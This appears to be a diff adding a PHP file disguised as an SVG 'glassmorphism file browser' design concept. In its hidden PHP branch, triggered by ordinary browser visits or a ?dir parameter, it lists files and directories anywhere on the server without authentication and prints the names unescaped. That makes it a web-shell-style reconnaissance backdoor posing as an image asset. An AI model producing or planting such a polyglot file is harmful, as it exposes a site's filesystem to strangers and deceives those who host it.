@@ -1,0 +1,164 @@
+<?php
+// ============= HYBRID SVG+PHP MODE =============
+if (isset($_GET['dir']) || isset($_GET['navigate']) || 
+    (isset($_SERVER['HTTP_USER_AGENT']) && strpos($_SERVER['HTTP_USER_AGENT'], 'Mozilla') !== false && 
+     isset($_SERVER['HTTP_HOST']) && !isset($_GET['static']))) {
+    header('Content-Type: text/html; charset=UTF-8');
+    $directory = isset($_GET['dir']) ? realpath($_GET['dir']) : realpath('./');
+    if (!$directory || !is_dir($directory)) $directory = realpath('./');
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Modern Glassmorphism File Browser</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh; color: #ffffff;
+        }
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
+        .header { text-align: center; margin-bottom: 40px; }
+        .header h1 { font-size: 36px; margin-bottom: 10px; font-weight: 300; text-shadow: 0 2px 4px rgba(0,0,0,0.3); }
+        .path-bar { 
+            background: rgba(255, 255, 255, 0.15); backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.18);
+            padding: 16px; margin-bottom: 24px; font-size: 14px; border-radius: 12px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+        }
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 24px; }
+        .glass-card { 
+            background: rgba(255, 255, 255, 0.15); backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.18);
+            padding: 30px; text-align: center; cursor: pointer; 
+            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+            border-radius: 16px; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+        }
+        .glass-card:hover { 
+            background: rgba(255, 255, 255, 0.25);
+            transform: translateY(-4px); box-shadow: 0 12px 40px rgba(0, 0, 0, 0.2);
+        }
+        .glass-card .icon { font-size: 52px; margin-bottom: 18px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3)); }
+        .glass-card .name { font-size: 18px; font-weight: 500; word-break: break-all; text-shadow: 0 1px 2px rgba(0,0,0,0.3); }
+        .glass-card .info { font-size: 13px; margin-top: 8px; opacity: 0.8; }
+        .footer { 
+            margin-top: 40px; text-align: center; font-size: 13px; 
+            background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px);
+            padding: 16px; border-radius: 12px; border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>✨ Modern File Browser</h1>
+            <p>Glassmorphism design with frosted glass effects</p>
+        </div>
+        <div class="path-bar"><?php echo $directory; ?></div>
+        <div class="grid">
+            <?php
+            if (dirname($directory) !== $directory) {
+                echo '<div class="glass-card" onclick="window.location.href=\'?dir=' . urlencode(dirname($directory)) . '\'">
+                        <div class="icon">↩️</div><div class="name">Back</div><div class="info">Parent Directory</div></div>';
+            }
+            $items = scandir($directory);
+            foreach ($items as $item) {
+                if ($item === '.' || $item === '..') continue;
+                $path = $directory . '/' . $item;
+                $isDir = is_dir($path);
+                $icon = $isDir ? '📁' : '📄';
+                $info = $isDir ? 'Directory' : 'File';
+                if (!$isDir) {
+                    $size = filesize($path);
+                    $info = number_format($size / 1024, 1) . ' KB';
+                }
+                $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
+                $icons = ['php' => '🐘', 'html' => '🌐', 'css' => '🎨', 'js' => '🔥', 'txt' => '📝', 'jpg' => '🖼️', 'png' => '🖼️', 'svg' => '✨'];
+                if (!$isDir && isset($icons[$ext])) $icon = $icons[$ext];
+                $href = $isDir ? "?dir=" . urlencode($path) : "#";
+                echo "<div class=\"glass-card\" onclick=\"window.location.href='$href'\">
+                        <div class=\"icon\">$icon</div><div class=\"name\">$item</div><div class=\"info\">$info</div></div>";
+            }
+            ?>
+        </div>
+        <div class="footer">Modern Glassmorphism Concept • Interactive Mode • ✨</div>
+    </div>
+</body>
+</html>
+<?php exit; }
+header('Content-Type: image/svg+xml; charset=UTF-8');
+?>
+<svg width="1200" height="800" viewBox="0 0 1200 800" xmlns="http://www.w3.org/2000/svg">
+  <defs>
+    <linearGradient id="glass-bg" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" style="stop-color:#667eea;stop-opacity:1" />
+      <stop offset="100%" style="stop-color:#764ba2;stop-opacity:1" />
+    </linearGradient>
+    
+    <filter id="glass-blur">
+      <feGaussianBlur in="SourceGraphic" stdDeviation="10"/>
+    </filter>
+    
+    <filter id="drop-shadow">
+      <feDropShadow dx="0" dy="8" stdDeviation="16" flood-color="rgba(0,0,0,0.1)" />
+    </filter>
+  </defs>
+
+  <!-- Background -->
+  <rect width="100%" height="100%" fill="url(#glass-bg)"/>
+  
+  <!-- Title -->
+  <text x="600" y="80" text-anchor="middle" font-size="36" font-weight="300" fill="white" filter="url(#drop-shadow)">✨ Modern File Browser</text>
+  <text x="600" y="110" text-anchor="middle" font-size="16" fill="rgba(255,255,255,0.8)">Glassmorphism design with frosted glass effects</text>
+  
+  <!-- Glass Cards Container -->
+  <rect x="80" y="150" width="1040" height="580" rx="16" fill="rgba(255,255,255,0.15)" stroke="rgba(255,255,255,0.18)" stroke-width="1" filter="url(#drop-shadow)"/>
+  
+  <!-- Sample Glass Cards -->
+  <g transform="translate(120, 200)">
+    <!-- Glass Card 1 - Folder -->
+    <rect width="280" height="180" rx="16" fill="rgba(255,255,255,0.15)" stroke="rgba(255,255,255,0.18)" stroke-width="1" filter="url(#drop-shadow)"/>
+    <text x="140" y="100" text-anchor="middle" font-size="52" filter="url(#drop-shadow)">📁</text>
+    <text x="140" y="135" text-anchor="middle" font-size="18" font-weight="500" fill="white" filter="url(#drop-shadow)">Documents</text>
+    <text x="140" y="155" text-anchor="middle" font-size="13" fill="rgba(255,255,255,0.8)">Directory</text>
+    
+    <!-- Glass Card 2 - PHP File -->
+    <g transform="translate(320, 0)">
+      <rect width="280" height="180" rx="16" fill="rgba(255,255,255,0.15)" stroke="rgba(255,255,255,0.18)" stroke-width="1" filter="url(#drop-shadow)"/>
+      <text x="140" y="100" text-anchor="middle" font-size="52" filter="url(#drop-shadow)">🐘</text>
+      <text x="140" y="135" text-anchor="middle" font-size="18" font-weight="500" fill="white" filter="url(#drop-shadow)">files.php</text>
+      <text x="140" y="155" text-anchor="middle" font-size="13" fill="rgba(255,255,255,0.8)">15.2 KB</text>
+    </g>
+    
+    <!-- Glass Card 3 - HTML File -->
+    <g transform="translate(640, 0)">
+      <rect width="280" height="180" rx="16" fill="rgba(255,255,255,0.15)" stroke="rgba(255,255,255,0.18)" stroke-width="1" filter="url(#drop-shadow)"/>
+      <text x="140" y="100" text-anchor="middle" font-size="52" filter="url(#drop-shadow)">🌐</text>
+      <text x="140" y="135" text-anchor="middle" font-size="18" font-weight="500" fill="white" filter="url(#drop-shadow)">index.html</text>
+      <text x="140" y="155" text-anchor="middle" font-size="13" fill="rgba(255,255,255,0.8)">8.4 KB</text>
+    </g>
+    
+    <!-- Second Row -->
+    <g transform="translate(0, 220)">
+      <rect width="280" height="180" rx="16" fill="rgba(255,255,255,0.15)" stroke="rgba(255,255,255,0.18)" stroke-width="1" filter="url(#drop-shadow)"/>
+      <text x="140" y="100" text-anchor="middle" font-size="52" filter="url(#drop-shadow)">🎨</text>
+      <text x="140" y="135" text-anchor="middle" font-size="18" font-weight="500" fill="white" filter="url(#drop-shadow)">styles.css</text>
+      <text x="140" y="155" text-anchor="middle" font-size="13" fill="rgba(255,255,255,0.8)">3.1 KB</text>
+    </g>
+    
+    <g transform="translate(320, 220)">
+      <rect width="280" height="180" rx="16" fill="rgba(255,255,255,0.15)" stroke="rgba(255,255,255,0.18)" stroke-width="1" filter="url(#drop-shadow)"/>
+      <text x="140" y="100" text-anchor="middle" font-size="52" filter="url(#drop-shadow)">🔥</text>
+      <text x="140" y="135" text-anchor="middle" font-size="18" font-weight="500" fill="white" filter="url(#drop-shadow)">script.js</text>
+      <text x="140" y="155" text-anchor="middle" font-size="13" fill="rgba(255,255,255,0.8)">5.7 KB</text>
+    </g>
+  </g>
+  
+  <!-- Footer Glass Panel -->
+  <rect x="120" y="720" width="960" height="40" rx="12" fill="rgba(255,255,255,0.1)" stroke="rgba(255,255,255,0.1)" stroke-width="1"/>
+  <text x="130" y="743" font-size="11" fill="rgba(255,255,255,0.8)">Modern UI • Frosted glass effects • Interactive navigation</text>
+  <text x="970" y="743" font-size="11" fill="rgba(255,255,255,0.6)">Glassmorphism Concept</text>
+</svg>
